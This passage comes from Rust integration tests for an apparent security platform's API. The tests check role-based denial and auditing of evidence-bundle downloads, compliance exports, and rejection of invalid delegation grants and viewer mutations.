        .oneshot(viewer_download_request)
        .await
        .expect("viewer bundle download request");
    assert_eq!(viewer_download_response.status(), StatusCode::FORBIDDEN);
    let denied_bundle_metadata_row = sqlx::query::query(
        r#"SELECT event_type, quantity, metadata
           FROM usage_events
           WHERE tenant_id = $1
             AND event_type = 'case_evidence_bundle.metadata_access_denied'"#,
    )
    .bind(harness.tenant_id)
    .fetch_one(&harness.db)
    .await
    .expect("denied bundle metadata access should be audited");
    let denied_bundle_metadata: Value = denied_bundle_metadata_row
        .try_get("metadata")
        .expect("denied bundle metadata audit metadata");
    assert_eq!(
        denied_bundle_metadata_row
            .try_get::<String, _>("event_type")
            .expect("denied bundle metadata event type"),
        "case_evidence_bundle.metadata_access_denied"
    );
    assert_eq!(
        denied_bundle_metadata_row
            .try_get::<i32, _>("quantity")
            .expect("denied bundle metadata quantity"),
        1
    );
    assert_eq!(denied_bundle_metadata["exportId"], case_bundle_export_id);
    assert_eq!(denied_bundle_metadata["actorType"], "service");
    assert_eq!(denied_bundle_metadata["actorRole"], "viewer");
    assert_eq!(
        denied_bundle_metadata["deniedReason"],
        "non_viewer_required"
    );
    assert!(denied_bundle_metadata.get("bundle").is_none());

    let denied_bundle_download_row = sqlx::query::query(
        r#"SELECT event_type, quantity, metadata
           FROM usage_events
           WHERE tenant_id = $1
             AND event_type = 'case_evidence_bundle.download_denied'"#,
    )
    .bind(harness.tenant_id)
    .fetch_one(&harness.db)
    .await
    .expect("denied bundle download should be audited");
    let denied_bundle_download: Value = denied_bundle_download_row
        .try_get("metadata")
        .expect("denied bundle download audit metadata");
    assert_eq!(
        denied_bundle_download_row
            .try_get::<String, _>("event_type")
            .expect("denied bundle download event type"),
        "case_evidence_bundle.download_denied"
    );
    assert_eq!(
        denied_bundle_download_row
            .try_get::<i32, _>("quantity")
            .expect("denied bundle download quantity"),
        1
    );
    assert_eq!(denied_bundle_download["exportId"], case_bundle_export_id);
    assert_eq!(denied_bundle_download["actorType"], "service");
    assert_eq!(denied_bundle_download["actorRole"], "viewer");
    assert_eq!(
        denied_bundle_download["deniedReason"],
        "non_viewer_required"
    );
    assert!(denied_bundle_download.get("bundle").is_none());

    let admin_download_request = Request::builder()
        .method(Method::GET)
        .uri(format!(
            "/api/v1/evidence-bundles/{case_bundle_export_id}/download"
        ))
        .header("x-api-key", &harness.api_key)
        .body(Body::empty())
        .expect("build admin bundle download request");
    let admin_download_response = harness
        .app
        .clone()
        .oneshot(admin_download_request)
        .await
        .expect("admin bundle download request");
    assert_eq!(admin_download_response.status(), StatusCode::OK);
    let admin_bundle_bytes = to_bytes(admin_download_response.into_body(), 4 * 1024 * 1024)
        .await
        .expect("read admin bundle body");
    let bundle_download_audit_row = sqlx::query::query(
        r#"SELECT event_type, quantity, metadata
           FROM usage_events
           WHERE tenant_id = $1
             AND event_type = 'case_evidence_bundle.downloaded'"#,
    )
    .bind(harness.tenant_id)
    .fetch_one(&harness.db)
    .await
    .expect("bundle download should be audited");
    let bundle_download_metadata: Value = bundle_download_audit_row
        .try_get("metadata")
        .expect("bundle download audit metadata");
    assert_eq!(
        bundle_download_audit_row
            .try_get::<String, _>("event_type")
            .expect("bundle download event type"),
        "case_evidence_bundle.downloaded"
    );
    assert_eq!(
        bundle_download_audit_row
            .try_get::<i32, _>("quantity")
            .expect("bundle download quantity"),
        1
    );
    assert_eq!(bundle_download_metadata["exportId"], case_bundle_export_id);
    assert_eq!(
        bundle_download_metadata["caseId"],
        fixture.case_id.to_string()
    );
    assert_eq!(bundle_download_metadata["actorType"], "service");
    assert_eq!(bundle_download_metadata["actorRole"], "admin");
    assert!(bundle_download_metadata["sha256"].as_str().is_some());
    assert!(bundle_download_metadata["sizeBytes"].as_i64().is_some());
    assert!(bundle_download_metadata.get("bundle").is_none());
    let audit_events_jsonl = zip_entry_text(&admin_bundle_bytes, "audit-events.jsonl");
    let audit_events = audit_events_jsonl
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("audit event json line"))
        .collect::<Vec<_>>();
    assert_eq!(audit_events.len(), 2);
    assert!(audit_events.iter().any(|event| event["eventType"]
        == "endpoint_evidence_archive.raw_uploaded"
        && event["metadata"]["archiveId"] == archive_id
        && event["metadata"].get("archive").is_none()));
    assert!(audit_events.iter().any(|event| event["eventType"]
        == "endpoint_evidence_archive.raw_download_denied"
        && event["metadata"]["archiveId"] == archive_id
        && event["metadata"]["deniedReason"] == "admin_or_owner_required"
        && event["metadata"].get("archive").is_none()));

    let manifest_json = zip_entry_text(&admin_bundle_bytes, "manifest.json");
    let manifest: Value = serde_json::from_str(&manifest_json).expect("bundle manifest json");
    assert_eq!(manifest["metadata"]["artifactCounts"]["audit_event"], 2);

    let follow_up_bundle_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/cases/{}/evidence/export", fixture.case_id),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "includeRawEnvelopes": true
        })),
    )
    .await;
    assert_eq!(follow_up_bundle_resp.0, StatusCode::OK);
    assert_eq!(follow_up_bundle_resp.1["artifactCounts"]["audit_event"], 8);
    let follow_up_export_id = follow_up_bundle_resp.1["exportId"]
        .as_str()
        .expect("follow-up case bundle export id");
    let follow_up_download_request = Request::builder()
        .method(Method::GET)
        .uri(format!(
            "/api/v1/evidence-bundles/{follow_up_export_id}/download"
        ))
        .header("x-api-key", &harness.api_key)
        .body(Body::empty())
        .expect("build follow-up bundle download request");
    let follow_up_download_response = harness
        .app
        .clone()
        .oneshot(follow_up_download_request)
        .await
        .expect("follow-up bundle download request");
    assert_eq!(follow_up_download_response.status(), StatusCode::OK);
    let follow_up_bundle_bytes = to_bytes(follow_up_download_response.into_body(), 4 * 1024 * 1024)
        .await
        .expect("read follow-up bundle body");
    let follow_up_audit_events_jsonl =
        zip_entry_text(&follow_up_bundle_bytes, "audit-events.jsonl");
    let follow_up_audit_events = follow_up_audit_events_jsonl
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("follow-up audit event json line"))
        .collect::<Vec<_>>();
    assert_eq!(follow_up_audit_events.len(), 8);
    for expected_type in [
        "endpoint_evidence_archive.raw_uploaded",
        "endpoint_evidence_archive.raw_download_denied",
        "case_evidence_bundle.exported",
        "case_evidence_bundle.metadata_accessed",
        "case_evidence_bundle.export_denied",
        "case_evidence_bundle.metadata_access_denied",
        "case_evidence_bundle.download_denied",
        "case_evidence_bundle.downloaded",
    ] {
        assert!(
            follow_up_audit_events
                .iter()
                .any(|event| event["eventType"] == expected_type),
            "follow-up bundle should contain {expected_type}"
        );
    }
    assert!(follow_up_audit_events.iter().all(|event| event["metadata"]
        .as_object()
        .expect("audit event metadata object")
        .get("bundle")
        .is_none()));

    let export_from = (Utc::now() - chrono::Duration::minutes(10))
        .to_rfc3339_opts(chrono::SecondsFormat::Secs, true);
    let export_to = (Utc::now() + chrono::Duration::minutes(10))
        .to_rfc3339_opts(chrono::SecondsFormat::Secs, true);
    let csv_request = Request::builder()
        .method(Method::GET)
        .uri(format!(
            "/api/v1/compliance/export?from={export_from}&to={export_to}&format=csv"
        ))
        .header("x-api-key", &harness.api_key)
        .body(Body::empty())
        .expect("build case bundle CSV compliance export request");
    let csv_response = harness
        .app
        .clone()
        .oneshot(csv_request)
        .await
        .expect("case bundle CSV compliance export request");
    let csv_status = csv_response.status();
    let csv_bytes = to_bytes(csv_response.into_body(), 2 * 1024 * 1024)
        .await
        .expect("read case bundle CSV compliance export body");
    assert_eq!(csv_status, StatusCode::OK);
    let csv_body = String::from_utf8(csv_bytes.to_vec()).expect("case bundle CSV export utf8");
    for expected_type in [
        "case_evidence_bundle.exported",
        "case_evidence_bundle.metadata_accessed",
        "case_evidence_bundle.export_denied",
        "case_evidence_bundle.metadata_access_denied",
        "case_evidence_bundle.download_denied",
        "case_evidence_bundle.downloaded",
    ] {
        assert!(
            csv_body.contains(expected_type),
            "CSV compliance export should contain {expected_type}"
        );
    }
    assert!(csv_body.contains(case_bundle_export_id));
    assert!(!csv_body.contains("\"bundle\""));

    let cef_request = Request::builder()
        .method(Method::GET)
        .uri(format!(
            "/api/v1/compliance/export?from={export_from}&to={export_to}&format=cef"
        ))
        .header("x-api-key", &harness.api_key)
        .body(Body::empty())
        .expect("build case bundle CEF compliance export request");
    let cef_response = harness
        .app
        .clone()
        .oneshot(cef_request)
        .await
        .expect("case bundle CEF compliance export request");
    let cef_status = cef_response.status();
    let cef_bytes = to_bytes(cef_response.into_body(), 2 * 1024 * 1024)
        .await
        .expect("read case bundle CEF compliance export body");
    assert_eq!(cef_status, StatusCode::OK);
    let cef_body = String::from_utf8(cef_bytes.to_vec()).expect("case bundle CEF export utf8");
    for expected_type in [
        "case_evidence_bundle.exported",
        "case_evidence_bundle.metadata_accessed",
        "case_evidence_bundle.export_denied",
        "case_evidence_bundle.metadata_access_denied",
        "case_evidence_bundle.download_denied",
        "case_evidence_bundle.downloaded",
    ] {
        assert!(
            cef_body.contains(expected_type),
            "CEF compliance export should contain {expected_type}"
        );
    }
    assert!(cef_body.contains(case_bundle_export_id));
    assert!(!cef_body.contains("\"bundle\""));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn expired_evidence_bundles_are_not_downloadable() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let export_id = format!("exp-{}", Uuid::new_v4());
    let file_path = std::env::temp_dir().join(format!("{export_id}.zip"));
    std::fs::write(&file_path, b"bundle").expect("write evidence bundle fixture");

    sqlx::query::query(
        r#"INSERT INTO fleet_evidence_bundles (
               export_id,
               tenant_id,
               status,
               requested_by,
               requested_at,
               completed_at,
               file_path,
               sha256,
               size_bytes,
               expires_at,
               retention_days,
               filters,
               artifact_counts,
               metadata
           ) VALUES (
               $1,
               $2,
               'completed',
               'operator@example.com',
               now() - interval '2 days',
               now() - interval '2 days',
               $3,
               'deadbeef',
               6,
               now() - interval '1 hour',
               1,
               '{}'::jsonb,
               '{}'::jsonb,
               '{}'::jsonb
           )"#,
    )
    .bind(&export_id)
    .bind(harness.tenant_id)
    .bind(file_path.to_string_lossy().to_string())
    .execute(&harness.db)
    .await
    .expect("seed expired evidence bundle");

    let download_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/evidence-bundles/{export_id}/download"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(download_resp.0, StatusCode::BAD_REQUEST);
    assert_eq!(download_resp.1["error"], "evidence bundle has expired");

    let status: String = sqlx::query::query(
        "SELECT status FROM fleet_evidence_bundles WHERE tenant_id = $1 AND export_id = $2",
    )
    .bind(harness.tenant_id)
    .bind(&export_id)
    .fetch_one(&harness.db)
    .await
    .expect("fetch expired bundle status")
    .try_get("status")
    .expect("read bundle status");
    assert_eq!(status, "expired");

    let _ = std::fs::remove_file(file_path);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn authorization_bearer_header_rejects_api_keys() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;

    let response = request_json_bearer(
        &harness.app,
        Method::GET,
        "/api/v1/console/overview".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(response.0, StatusCode::UNAUTHORIZED);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn grants_reject_child_tokens_that_violate_parent_chain_constraints() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let now = Utc::now().timestamp();

    let parent_keypair = hush_core::Keypair::generate();
    let parent_claims = hush_multi_agent::DelegationClaims::new(
        hush_multi_agent::AgentId::new("agent:root").expect("root issuer"),
        hush_multi_agent::AgentId::new("agent:child").expect("parent subject"),
        now,
        now + 3600,
        vec![hush_multi_agent::AgentCapability::DeployApproval],
    )
    .expect("build parent claims");
    let parent_jti = parent_claims.jti.clone();
    let parent_token = hush_multi_agent::SignedDelegationToken::sign_with_public_key(
        parent_claims,
        &parent_keypair,
    )
    .expect("sign parent token");

    let parent_response = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/grants".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "token": parent_token,
            "grant_type": "delegation",
            "issuer_public_key": parent_keypair.public_key().to_hex()
        })),
    )
    .await;
    assert_eq!(parent_response.0, StatusCode::OK);

    let child_keypair = hush_core::Keypair::generate();
    let mut invalid_child_claims = hush_multi_agent::DelegationClaims::new(
        hush_multi_agent::AgentId::new("agent:spoofed").expect("spoofed issuer"),
        hush_multi_agent::AgentId::new("agent:grandchild").expect("grandchild subject"),
        now + 10,
        now + 600,
        vec![hush_multi_agent::AgentCapability::AgentAdmin],
    )
    .expect("build invalid child claims");
    invalid_child_claims.aud = hush_multi_agent::DELEGATION_AUDIENCE.to_string();
    invalid_child_claims.chn = vec![parent_jti];

    let invalid_child_token = hush_multi_agent::SignedDelegationToken::sign_with_public_key(
        invalid_child_claims,
        &child_keypair,
    )
    .expect("sign invalid child token");

    let child_response = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/grants".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "token": invalid_child_token,
            "grant_type": "delegation",
            "issuer_public_key": child_keypair.public_key().to_hex()
        })),
    )
    .await;
    assert_eq!(child_response.0, StatusCode::BAD_REQUEST);
    let error_message = child_response.1["error"].as_str().unwrap_or_default();
    assert!(!error_message.is_empty());
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn grants_reject_unregistered_issuers_without_explicit_public_keys() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let keypair = hush_core::Keypair::generate();
    let now = Utc::now().timestamp();
    let claims = hush_multi_agent::DelegationClaims::new(
        hush_multi_agent::AgentId::new("agent:unregistered-root").expect("issuer"),
        hush_multi_agent::AgentId::new("agent:delegate").expect("subject"),
        now,
        now + 600,
        vec![hush_multi_agent::AgentCapability::DeployApproval],
    )
    .expect("build delegation claims");
    let token = hush_multi_agent::SignedDelegationToken::sign_with_public_key(claims, &keypair)
        .expect("sign delegation token");

    let response = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/grants".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "token": token,
            "grant_type": "delegation"
        })),
    )
    .await;
    assert_eq!(response.0, StatusCode::BAD_REQUEST);
    assert_eq!(
        response.1["error"],
        "issuer_public_key is required for issuers that are not enrolled in the directory"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn grants_reject_revoked_registered_principal_issuers() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let keypair = hush_core::Keypair::generate();
    let stable_ref = "revoked-issuer";
    let principal_id = Uuid::new_v4();

    sqlx::query::query(
        r#"INSERT INTO principals (
               id,
               tenant_id,
               principal_type,
               stable_ref,
               display_name,
               trust_level,
               lifecycle_state,
               liveness_state,
               public_key,
               metadata
           ) VALUES (
               $1,
               $2,
               'service_account',
               $3,
               'Revoked Issuer',
               'high',
               'revoked',
               'active',
               $4,
               '{}'::jsonb
           )"#,
    )
    .bind(principal_id)
    .bind(harness.tenant_id)
    .bind(stable_ref)
    .bind(keypair.public_key().to_hex())
    .execute(&harness.db)
    .await
    .expect("seed revoked issuer principal");

    let now = Utc::now().timestamp();
    let claims = hush_multi_agent::DelegationClaims::new(
        hush_multi_agent::AgentId::new(stable_ref).expect("issuer"),
        hush_multi_agent::AgentId::new("agent:delegate").expect("subject"),
        now,
        now + 600,
        vec![hush_multi_agent::AgentCapability::DeployApproval],
    )
    .expect("build delegation claims");
    let token = hush_multi_agent::SignedDelegationToken::sign_with_public_key(claims, &keypair)
        .expect("sign delegation token");

    let response = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/grants".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "token": token,
            "grant_type": "delegation"
        })),
    )
    .await;
    assert_eq!(response.0, StatusCode::FORBIDDEN);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn grant_mutation_endpoints_require_admin_equivalent_roles() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let fixture = seed_console_read_model_fixture(&harness).await;
    let member_api_key = "cs_it_grant_member_key";
    insert_api_key_for_tenant(
        &harness.db,
        harness.tenant_id,
        member_api_key,
        "member",
        &["write"],
    )
    .await;

    let keypair = hush_core::Keypair::generate();
    let now = Utc::now().timestamp();
    let claims = hush_multi_agent::DelegationClaims::new(
        hush_multi_agent::AgentId::new("agent:member-test-issuer").expect("issuer"),
        hush_multi_agent::AgentId::new("agent:member-test-subject").expect("subject"),
        now,
        now + 600,
        vec![hush_multi_agent::AgentCapability::DeployApproval],
    )
    .expect("build delegation claims");
    let token = hush_multi_agent::SignedDelegationToken::sign_with_public_key(claims, &keypair)
        .expect("sign delegation token");

    let ingest_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/grants".to_string(),
        Some(member_api_key),
        Some(serde_json::json!({
            "token": token,
            "grant_type": "delegation",
            "issuer_public_key": keypair.public_key().to_hex()
        })),
    )
    .await;
    assert_eq!(ingest_resp.0, StatusCode::FORBIDDEN);

    let exercise_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/grants/{}/exercise", fixture.grant_id),
        Some(member_api_key),
        Some(serde_json::json!({})),
    )
    .await;
    assert_eq!(exercise_resp.0, StatusCode::FORBIDDEN);

    let revoke_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/grants/{}/revoke", fixture.grant_id),
        Some(member_api_key),
        Some(serde_json::json!({
            "reason": "should be forbidden"
        })),
    )
    .await;
    assert_eq!(revoke_resp.0, StatusCode::FORBIDDEN);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn grants_ingest_is_idempotent_and_conflicts_on_reused_jti_with_different_contents() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let keypair = hush_core::Keypair::generate();
    let now = Utc::now().timestamp();
    let mut claims = hush_multi_agent::DelegationClaims::new(
        hush_multi_agent::AgentId::new("agent:immutable-root").expect("issuer"),
        hush_multi_agent::AgentId::new("agent:immutable-subject").expect("subject"),
        now,
        now + 900,
        vec![hush_multi_agent::AgentCapability::DeployApproval],
    )
    .expect("build delegation claims");
    claims.pur = Some("immutable ingest".to_string());
    claims.ctx = Some(serde_json::json!({ "run": "first" }));
    let token_jti = claims.jti.clone();
    let token = hush_multi_agent::SignedDelegationToken::sign_with_public_key(claims, &keypair)
        .expect("sign delegation token");

    let first_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/grants".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "token": token.clone(),
            "grant_type": "delegation",
            "issuer_public_key": keypair.public_key().to_hex()
        })),
    )
    .await;
    assert_eq!(first_resp.0, StatusCode::OK);
    let grant_id = first_resp.1["id"].as_str().expect("grant id").to_string();

    let duplicate_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/grants".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "token": token,
            "grant_type": "delegation",
            "issuer_public_key": keypair.public_key().to_hex()
        })),
    )
    .await;
    assert_eq!(duplicate_resp.0, StatusCode::OK);
    assert_eq!(duplicate_resp.1["id"], grant_id);

    let mut conflicting_claims = hush_multi_agent::DelegationClaims::new(
        hush_multi_agent::AgentId::new("agent:immutable-root").expect("issuer"),
        hush_multi_agent::AgentId::new("agent:immutable-subject").expect("subject"),
        now,
        now + 900,
        vec![hush_multi_agent::AgentCapability::DeployApproval],
    )
    .expect("build conflicting claims");
    conflicting_claims.jti = token_jti.clone();
    conflicting_claims.pur = Some("mutated grant".to_string());
    conflicting_claims.ctx = Some(serde_json::json!({ "run": "mutated" }));
    let conflicting_token =
        hush_multi_agent::SignedDelegationToken::sign_with_public_key(conflicting_claims, &keypair)
            .expect("sign conflicting delegation token");

    let conflict_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/grants".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "token": conflicting_token,
            "grant_type": "delegation",
            "issuer_public_key": keypair.public_key().to_hex()
        })),
    )
    .await;
    assert_eq!(conflict_resp.0, StatusCode::CONFLICT);

    let grant_count = sqlx::query_scalar::query_scalar::<_, i64>(
        r#"SELECT COUNT(*)
           FROM fleet_grants
           WHERE tenant_id = $1
             AND token_jti = $2"#,
    )
    .bind(harness.tenant_id)
    .bind(token_jti)
    .fetch_one(&harness.db)
    .await
    .expect("count immutable grants");
    assert_eq!(grant_count, 1);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn grant_exercise_requires_verified_event_and_active_grant() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let fixture = seed_operator_flow_fixture(&harness).await;
    let valid_event_id = "grant-exercise-valid";
    let mismatched_event_id = "grant-exercise-mismatched";

    let valid_event_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/events/ingest".to_string(),
        Some(&harness.api_key),
        Some(signed_hunt_ingest_request(
            &harness,
            serde_json::json!({
                "eventId": valid_event_id,
                "tenantId": harness.tenant_id.to_string(),
                "source": "response",
                "kind": "response_action_updated",
                "occurredAt": "2026-03-06T14:00:00Z",
                "ingestedAt": "2026-03-06T14:00:01Z",
                "severity": "medium",
                "verdict": "deny",
                "summary": "verified response exercise event",
                "actionType": "request_policy_reload",
                "principal": {
                    "principalId": fixture.principal_id.to_string(),
                    "endpointAgentId": fixture.agent_id,
                    "principalType": "endpoint_agent"
                },
                "sessionId": fixture.session_id,
                "grantId": fixture.grant_id.to_string(),
                "responseActionId": fixture.action_id.to_string(),
                "target": {
                    "kind": "endpoint",
                    "id": fixture.agent_id,
                    "name": "Operator Endpoint"
                },
                "evidence": {
                    "rawRef": fixture.response_raw_ref,
                    "envelopeHash": "hash-grant-exercise-valid",
                    "issuer": "spiffe://tenant/acme-int",
                    "schemaName": "clawdstrike.sdr.fact.response_action.v1",
                    "signatureValid": true
                },
                "attributes": {
                    "status": "published"
                }
            }),
        )),
    )
    .await;
    assert_eq!(valid_event_resp.0, StatusCode::OK);

    let missing_event_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/grants/{}/exercise", fixture.grant_id),
        Some(&harness.api_key),
        Some(serde_json::json!({})),
    )
    .await;
    assert_eq!(missing_event_resp.0, StatusCode::BAD_REQUEST);

    let mismatched_event_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/events/ingest".to_string(),
        Some(&harness.api_key),
        Some(signed_hunt_ingest_request(
            &harness,
            serde_json::json!({
                "eventId": mismatched_event_id,
                "tenantId": harness.tenant_id.to_string(),
                "source": "response",
                "kind": "response_action_updated",
                "occurredAt": "2026-03-06T14:05:00Z",
                "ingestedAt": "2026-03-06T14:05:01Z",
                "severity": "medium",
                "verdict": "deny",
                "summary": "mismatched grant exercise event",
                "actionType": "request_policy_reload",
                "principal": {
                    "principalId": fixture.principal_id.to_string(),
                    "endpointAgentId": fixture.agent_id,
                    "principalType": "endpoint_agent"
                },
                "sessionId": fixture.session_id,
                "grantId": Uuid::new_v4().to_string(),
                "responseActionId": fixture.action_id.to_string(),
                "target": {
                    "kind": "endpoint",
                    "id": fixture.agent_id,
                    "name": "Operator Endpoint"
                },
                "evidence": {
                    "rawRef": "hunt-envelope:grant-exercise-mismatched",
                    "envelopeHash": "hash-grant-exercise-mismatched",
                    "issuer": "spiffe://tenant/acme-int",
                    "schemaName": "clawdstrike.sdr.fact.response_action.v1",
                    "signatureValid": true
                },
                "attributes": {
                    "status": "published"
                }
            }),
        )),
    )
    .await;
    assert_eq!(mismatched_event_resp.0, StatusCode::OK);

    let wrong_event_grant_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/grants/{}/exercise", fixture.grant_id),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "event_id": mismatched_event_id
        })),
    )
    .await;
    assert_eq!(wrong_event_grant_resp.0, StatusCode::BAD_REQUEST);

    sqlx::query::query(
        r#"UPDATE fleet_grants
           SET status = 'revoked',
               revoked_at = now(),
               updated_at = now()
           WHERE tenant_id = $1
             AND id = $2"#,
    )
    .bind(harness.tenant_id)
    .bind(fixture.grant_id)
    .execute(&harness.db)
    .await
    .expect("revoke fixture grant");

    let revoked_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/grants/{}/exercise", fixture.grant_id),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "event_id": valid_event_id
        })),
    )
    .await;
    assert_eq!(revoked_resp.0, StatusCode::CONFLICT);

    let revoked_missing_event_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/grants/{}/exercise", fixture.grant_id),
        Some(&harness.api_key),
        Some(serde_json::json!({})),
    )
    .await;
    assert_eq!(revoked_missing_event_resp.0, StatusCode::BAD_REQUEST);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn hunt_mutation_endpoints_reject_viewer_api_keys() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let viewer_api_key = "cs_it_viewer_key";
    insert_api_key_for_tenant(
        &harness.db,
        harness.tenant_id,
        viewer_api_key,
        "viewer",
        &[],
    )
    .await;

    let create_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/saved".to_string(),
        Some(viewer_api_key),
        Some(serde_json::json!({
            "name": "viewer forbidden",
            "query": {
                "limit": 10
            }
        })),
    )
    .await;
    assert_eq!(create_resp.0, StatusCode::FORBIDDEN);

    let correlate_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/correlate".to_string(),
        Some(viewer_api_key),
        Some(serde_json::json!({
            "rules": []
        })),
    )
    .await;
    assert_eq!(correlate_resp.0, StatusCode::FORBIDDEN);

    let ioc_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/ioc/match".to_string(),
        Some(viewer_api_key),
        Some(serde_json::json!({
            "indicators": []
        })),
    )
    .await;
    assert_eq!(ioc_resp.0, StatusCode::FORBIDDEN);

    let saved_hunt_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hunt/saved".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "admin hunt",
            "query": {
                "limit": 10
            }
        })),
    )
    .await;
    assert_eq!(saved_hunt_resp.0, StatusCode::OK);
    let saved_hunt_id = saved_hunt_resp.1["id"]
        .as_str()
        .expect("saved hunt id")
        .to_string();

    let update_resp = request_json(
        &harness.app,
        Method::PATCH,
        format!("/api/v1/hunt/saved/{saved_hunt_id}"),
        Some(viewer_api_key),
        Some(serde_json::json!({
            "name": "viewer rename"
        })),
    )
    .await;
    assert_eq!(update_resp.0, StatusCode::FORBIDDEN);

    let run_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/hunt/saved/{saved_hunt_id}/run"),
        Some(viewer_api_key),
        None,
    )
    .await;
    assert_eq!(run_resp.0, StatusCode::FORBIDDEN);

    let delete_resp = request_json(
        &harness.app,
        Method::DELETE,
        format!("/api/v1/hunt/saved/{saved_hunt_id}"),
        Some(viewer_api_key),
        None,
    )
    .await;
    assert_eq!(delete_resp.0, StatusCode::FORBIDDEN);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn response_actions_execute_supported_cloud_only_targets() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let fixture = seed_console_read_model_fixture(&harness).await;

    let quarantine_create = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/response-actions".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "actionType": "quarantine_principal",
            "target": {
                "kind": "principal",
                "id": fixture.principal_id.to_string()
            },
            "reason": "Contain endpoint",
            "requireAcknowledgement": false,
            "payload": {}
        })),
    )
    .await;
    assert_eq!(quarantine_create.0, StatusCode::OK);
    let quarantine_action_id = quarantine_create.1["id"]
        .as_str()
        .expect("quarantine action id")
        .to_string();

    let quarantine_approve = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/response-actions/{quarantine_action_id}/approve"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(quarantine_approve.0, StatusCode::OK);
    assert_eq!(quarantine_approve.1["action"]["status"], "acknowledged");
    assert_eq!(
        quarantine_approve.1["deliveries"][0]["status"],
        "acknowledged"
    );
    assert_eq!(
        quarantine_approve.1["acknowledgements"][0]["resulting_state"],
        "quarantined"
    );

    let principal_row = sqlx::query::query(
        "SELECT lifecycle_state FROM principals WHERE tenant_id = $1 AND id = $2",
    )
    .bind(harness.tenant_id)
    .bind(fixture.principal_id)
    .fetch_one(&harness.db)
    .await
    .expect("fetch principal lifecycle");
    let lifecycle_state: String = principal_row
        .try_get("lifecycle_state")
        .expect("principal lifecycle state");
    assert_eq!(lifecycle_state, "quarantined");
    assert_eq!(
        quarantine_approve.1["acknowledgements"][0]["raw_payload"]["revokedGrantIds"][0],
        fixture.grant_id.to_string()
    );

    let grant_row_after_quarantine =
        sqlx::query::query("SELECT status FROM fleet_grants WHERE tenant_id = $1 AND id = $2")
            .bind(harness.tenant_id)
            .bind(fixture.grant_id)
            .fetch_one(&harness.db)
            .await
            .expect("fetch grant status after quarantine");
    let grant_status_after_quarantine: String = grant_row_after_quarantine
        .try_get("status")
        .expect("grant status after quarantine");
    assert_eq!(grant_status_after_quarantine, "revoked");

    let revoke_create = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/response-actions".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
